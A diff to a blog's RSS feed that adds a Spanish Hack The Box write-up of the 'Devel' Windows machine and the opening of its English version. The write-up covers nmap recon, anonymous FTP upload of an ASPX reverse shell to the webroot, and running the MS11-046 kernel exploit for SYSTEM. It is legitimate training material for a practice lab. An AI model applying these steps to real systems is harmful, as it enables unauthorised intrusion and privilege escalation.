@@ -16,6 +16,470 @@
     
     
       <item>
+        <title>Devel - Hack The Box</title>
+        <description>&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/1.png&quot; alt=&quot;Info Card&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En esta ocasión vamos a resolver la máquina &lt;em&gt;Devel&lt;/em&gt; de &lt;em&gt;Hack The Box&lt;/em&gt;. Es una máquina &lt;em&gt;Windows&lt;/em&gt; de nivel de dificultad fácil tanto en la intrusión como en la escalada de privilegios.&lt;/p&gt;
+
+&lt;h3 id=&quot;fase-de-reconocimiento&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Reconocimiento&lt;/h3&gt;
+
+&lt;p&gt;Primeramente vamos a lanzar una &lt;em&gt;traza ICMP&lt;/em&gt; para saber si la máquina está activa.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/2.png&quot; alt=&quot;2&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del &lt;em&gt;TTL&lt;/em&gt;; en este caso el valor del &lt;em&gt;TTL&lt;/em&gt; de la máquina es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127&lt;/code&gt;, por lo que podemos intuir que estamos ante una máquina &lt;em&gt;Windows&lt;/em&gt;. Recordemos que algunos de los valores referenciales son los siguientes:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Sistema Operativo (OS)&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;TTL&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Linux&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;64&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Windows&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;128&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solaris&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;254&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Si nos damos cuenta, en esta ocasión, el valor del &lt;em&gt;TTL&lt;/em&gt; es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127&lt;/code&gt; y no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;128&lt;/code&gt; como indica la tabla anterior, esto se debe a que en el entorno de máquinas de &lt;em&gt;Hack The Box&lt;/em&gt;, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un nodo intermediario, por lo que el &lt;em&gt;TTL&lt;/em&gt; disminuye en una unidad.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.5 -R
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/3a.png&quot; alt=&quot;3&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Posteriormente, vamos a utilizar la herramienta &lt;em&gt;Nmap&lt;/em&gt; para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de puertos con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-p-&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escanea todo el rango de puertos (65535 en total)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;--open&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-T5&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;White Hat&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-v&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;em&gt;Verbose&lt;/em&gt;, reporta lo encontrado por consola&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-n&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;resolución DNS&lt;/em&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-sS&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escaneo &lt;em&gt;TCP SYN&lt;/em&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-min-rate&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Emitir paquetes no más lentos que &amp;lt;valor&amp;gt; por segundo&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-vvv&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Triple &lt;em&gt;verbose&lt;/em&gt;, para obtener mayor información por consola&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-Pn&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;host discovery&lt;/em&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versión y servicios que corren bajo estos puertos.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 21,80 10.10.10.5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-sC&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Scripts básicos de enumeración&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-sV&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Versión y servicios que corren bajo los puertos encontrados&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-p&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Basándonos en la información que nos reporta &lt;em&gt;Nmap&lt;/em&gt;, podemos darnos cuenta que la máquina víctima tiene abiertos puertos relacionados con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; (File Transfer Protocol).&lt;/p&gt;
+
+&lt;h3 id=&quot;fase-de-explotación&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Explotación&lt;/h3&gt;
+
+&lt;p&gt;Podemos empezar por enumerar el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt;. Para ello, podemos hacer uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WhatWeb&lt;/code&gt;, una herramienta que se encarga de identificar las tecnologías web que se están utilizando. Esto incluye gestores de contenido (CMS), librerías, plugins, o incluso el sistema operativo en el que se está alojando el servidor web.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whatweb http://10.10.10.5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/4.png&quot; alt=&quot;4&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;No hay nada que llame especialmente nuestra atención, salvo que la página está montada con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IIS&lt;/code&gt; (Internet Information Services), un servidor web desarrollado por &lt;em&gt;Microsoft&lt;/em&gt; para alojar sitios en sistemas &lt;em&gt;Windows&lt;/em&gt;, así como que la página parece estar bajo construcción.&lt;/p&gt;
+
+&lt;p&gt;Dado que no podemos obtener más información útil desde la terminal, tendremos que visitar la página desde nuestro navegador. Únicamente veremos el logo de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IIS&lt;/code&gt; versión 7, por lo que no parece haber mucho que hacer aquí de momento.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/5.png&quot; alt=&quot;5&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo siguiente que podemos hacer es enumerar el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt;. Para esto, utilizaremos un &lt;em&gt;null session&lt;/em&gt;, ya que no contamos con credenciales.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp anonymous@10.10.10.5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Al conectarnos, podemos observar lo que parece ser la estructura de archivos del sitio web alojado en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IIS&lt;/code&gt;. Encontramos un directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aspnet_client&lt;/code&gt; y archivos como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iisstart.htm&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;welcome.png&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/6.png&quot; alt=&quot;6&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Esto lo podemos corroborar descargando alguno de estos archivos y visualizándolos en nuestro equipo. Podemos, por ejemplo, probar con la imagen &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;welcome.png&lt;/code&gt;. Dado que se trata de un archivo que no es de texto, cambiaremos el modo de transferencia a &lt;em&gt;binary&lt;/em&gt;, lo que garantiza que el archivo se transfiera sin modificaciones, manteniendo su integridad byte por byte.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;binary
+get welcome.png
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/7.png&quot; alt=&quot;7&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/8.png&quot; alt=&quot;8&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Confirmamos que estamos frente a la misma imagen que habíamos visto desde nuestro navegador,  lo que sugiere una posible vía de subida de archivos al servidor web. A modo de prueba, podemos subir un archivo a través del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; y ver si se muestra en el sitio web. En mi caso, probé con una imagen.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;put &amp;lt;nombreArchivo&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/9.png&quot; alt=&quot;9&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que la imagen se muestra correctamente en la página web, así que podemos probar subir una &lt;em&gt;reverse shell&lt;/em&gt; al servidor. Algo que debemos tener en cuenta es que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IIS&lt;/code&gt; utiliza &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASP&lt;/code&gt;/&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASP.NET&lt;/code&gt; para ejecutar scripts del lado del servidor. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASP.NET&lt;/code&gt; es la versión más moderna del framework &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASP&lt;/code&gt; y se basa en el framework &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.NET&lt;/code&gt;, que es la plataforma de desarrollo de &lt;em&gt;Microsoft&lt;/em&gt; para crear aplicaciones. Por lo tanto, &lt;em&gt;la reverse shell&lt;/em&gt; que subiremos deberá estar en formato &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.aspx&lt;/code&gt; para que el servidor la interprete y ejecute correctamente.&lt;/p&gt;
+
+&lt;p&gt;Dicho esto, podríamos generar la &lt;em&gt;reverse shell&lt;/em&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MSFvenom&lt;/code&gt; o buscar una disponible públicamente en GitHub. En mi caso, utilizaré la &lt;a href=&quot;https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx&quot;&gt;shell&lt;/a&gt; del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;borjmz&lt;/code&gt;. Solo deberemos cambiar nuestra IP y puerto donde se indica, y luego subir la &lt;em&gt;shell&lt;/em&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;put shell.aspx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Podemos dirigirnos a &lt;a href=&quot;http://10.10.10.5/shell.aspx&quot;&gt;http://10.10.10.5/shell.aspx&lt;/a&gt; o, desde la propia consola, ejecutarla con:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://10.10.10.5/shell.aspx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De todos modos, conseguiremos una shell dentro de la máquina víctima como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IIS APPPOOL\web&lt;/code&gt;, por lo que tendremos que escalar privilegios.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/10.png&quot; alt=&quot;10&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;escalada-de-privilegios&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Escalada De Privilegios&lt;/h3&gt;
+
+&lt;p&gt;Podemos comenzar enumerando el sistema operativo utilizando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systeminfo&lt;/code&gt; para conocer su versión y verificar si tiene parches aplicados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systeminfo
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/11.png&quot; alt=&quot;11&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Encontramos que la versión del sistema operativo es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6.1.7600 Build 7600&lt;/code&gt;, y no tiene ningún parche aplicado. Al buscar más información sobre esta versión, descubrimos que es vulnerable a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MS11-046&lt;/code&gt;, una vulnerabilidad causada por el &lt;em&gt;Microsoft Windows Ancillary Function Driver&lt;/em&gt; (&lt;em&gt;AFD.sys&lt;/em&gt;), que al ejecutarse en modo kernel privilegiado, no valida correctamente el input proporcionado por usuarios de bajos privilegios.&lt;/p&gt;
+
+&lt;p&gt;Podemos buscar en línea algún exploit para aprovechar esta vulnerabilidad. Hay una versión ya compilada que es la que &lt;a href=&quot;https://www.exploit-db.com/exploits/40564&quot;&gt;usaremos&lt;/a&gt;. Recordemos que tenemos una vía potencial para subir archivos a través del servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt;, y podemos aprovecharla buscando en qué ruta se encuentran los archivos que vimos anteriormente. Por ejemplo, podemos realizar una búsqueda recursiva en el sistema para verificar dónde está almacenada la imagen &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;welcome.png&lt;/code&gt; que habíamos visualizado previamente.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; /s welcome.png
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/12.png&quot; alt=&quot;12&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/13.png&quot; alt=&quot;13&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Sabiendo que los archivos se encuentran en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\inetpub\wwwroot&lt;/code&gt;, podemos subir el exploit mediante &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt;, y una vez que el archivo esté dentro de la máquina víctima, podremos ejecutarlo directamente desde ahí.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;binary
+put MS11-046.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/14.png&quot; alt=&quot;14&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al ejecutarlo, obtendremos privilegios elevados, convirtiéndonos en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NT AUTHORITY\SYSTEM&lt;/code&gt;, lo que nos permitirá listar las flags de los dos usuarios en el sistema.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/15.png&quot; alt=&quot;15&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Mon, 21 Oct 2024 00:00:00 -0400</pubDate>
+        <link>/es/Devel-Hack-The-Box/</link>
+        <guid isPermaLink="true">/es/Devel-Hack-The-Box/</guid>
+      </item>
+    
+      <item>
+        <title>Devel - Hack The Box</title>
+        <description>&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/1.png&quot; alt=&quot;Info Card&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This time we are going to solve &lt;em&gt;Hack The Box’s&lt;/em&gt; &lt;em&gt;Devel&lt;/em&gt; machine. It is an easy-level &lt;em&gt;Windows&lt;/em&gt; machine, both in terms of exploitation and privilege escalation.&lt;/p&gt;
+
+&lt;h3 id=&quot;reconnaissance-phase&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Reconnaissance Phase&lt;/h3&gt;
+
+&lt;p&gt;First, we’re going to launch an &lt;em&gt;ICMP traceroute&lt;/em&gt; to check if the machine is active.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/2.png&quot; alt=&quot;2&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once we verify that the machine is active (as it returns a response), we can also determine what type of machine we are dealing with based on the &lt;em&gt;TTL&lt;/em&gt; value; in this case, the machine’s &lt;em&gt;TTL&lt;/em&gt; value is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127&lt;/code&gt;, so we can infer that we are dealing with a &lt;em&gt;Windows&lt;/em&gt; machine. Remember, some of the reference values are as follows:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Operating System (OS)&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;TTL&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Linux&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;64&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Windows&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;128&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solaris&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;254&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;If we notice, in this case, the &lt;em&gt;TTL&lt;/em&gt; value is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127&lt;/code&gt; instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;128&lt;/code&gt; as indicated in the table above. This is because, in the &lt;em&gt;Hack The Box&lt;/em&gt; environment, we are not communicating directly with the target machine; instead, there is an intermediary node, which causes the &lt;em&gt;TTL&lt;/em&gt; to decrease by one unit.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.5 -R
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/3b.png&quot; alt=&quot;3&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
